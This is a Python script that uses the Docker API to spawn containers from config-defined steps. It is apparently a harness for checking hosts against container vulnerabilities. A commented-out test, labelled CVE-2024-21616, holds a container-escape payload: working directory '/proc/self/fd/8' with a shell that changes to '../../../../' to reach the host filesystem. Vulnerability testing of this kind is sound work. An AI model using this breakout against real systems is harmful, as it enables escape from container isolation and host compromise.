import subprocess
import yaml
from config import *
import docker
from signal import SIGKILL
container = None
# Create a Docker API client
print("Starting Script")
client = docker.APIClient(base_url='unix://var/run/docker.sock')
print("Client Connected")
def is_service_running(service_name):
    try:
        subprocess.run(['systemctl', 'is-active', service_name], check=True, stdout=subprocess.PIPE)
        return True
    except subprocess.CalledProcessError:
        return False


def get_version():
    version_info = {}
    for key, value in versions.items():
        result = subprocess.run(value, check=True, stdout=subprocess.PIPE)
        version_info[key] = result.stdout.decode('utf-8').strip()
    
    return version_info


def parse_trick_and_run(config_data):
    # Create a Docker client
    client = docker.from_env()
    # Pull the 'ubuntu' image
    client.images.pull('ubuntu')
    results = {}

    for step in config_data['steps']:
        if 'spawnContainer' in step:

            container_name = step['spawnContainer']['name']

            # Check if the container with the given name already exists
            try:
                existing_container = client.containers.get(container_name)
                print(f"Container {container_name} already exists. Removing it.")
                if existing_container.status == 'running':
                    existing_container.kill(signal=SIGKILL)
                existing_container.remove(force=True)
            except docker.errors.NotFound:
                print(f"No existing container named {container_name} found. Proceeding to create a new one.")


            try:
                global container
                container = client.containers.run(
                    image=step['spawnContainer']['image'],
                    name=step['spawnContainer']['name'],
                    command=step['spawnContainer']['cmd'],
                    working_dir=step['spawnContainer']['working_dir'],
                    detach=True,
                    tty=True
                )
                print("CONTAINER STARTED")
                results['status'] = 'success'
                results['name'] = step['spawnContainer']['name']
                # container.wait(timeout=5)  # Wait for the container to finish
                # container.remove()  # Remove the container
            except Exception as e:
                results['status'] = 'failure'
                results['error'] = str(e)
            finally:
                if container is not None:
                    container.kill(signal=SIGKILL)
                    container.remove(force=True) 

    return results



# def test():
#     print("Starting test function")
    

#     # Pull the 'ubuntu' image
#     client.pull('ubuntu', None, stream=True)
#     # Pull the 'ubuntu' image
#     print("Ubuntu image pulled")


#     print("Docker client created")
#     results = {}

#     try:
#         existing_container = client.containers.get("CVE-2024-21616")
#         print("Container CVE-2024-21616 already exists. Removing it.")
#         if existing_container.status == 'running':
#             existing_container.kill(signal=SIGKILL)
#         existing_container.remove(force=True)
#     except docker.errors.NotFound:
#         print("No existing container named CVE-2024-21616 found. Proceeding to create a new one.")

#     try:
#         global container
#         container = client.containers.run(
#             image="ubuntu",
#             name="CVE-2024-21616",
#             command='/bin/bash -c "cd ../../../../ && exec /bin/bash"',
#             working_dir='/proc/self/fd/8',
#             detach=True,
#             tty=True
#         )
#         print("CONTAINER STARTED")
#         results['status'] = 'success'
#         results['name'] = "CVE-2024-21616"
#         # container.wait(timeout=5)  # Wait for the container to finish
#         # container.remove()  # Remove the container
#     except Exception as e:
#         results['status'] = 'failure'
#         results['error'] = str(e)
#     finally:
#         if container is not None:
#             container.kill(signal=SIGKILL)
#             container.remove(force=True) 

#     print("Returning results")
#     return results


# test()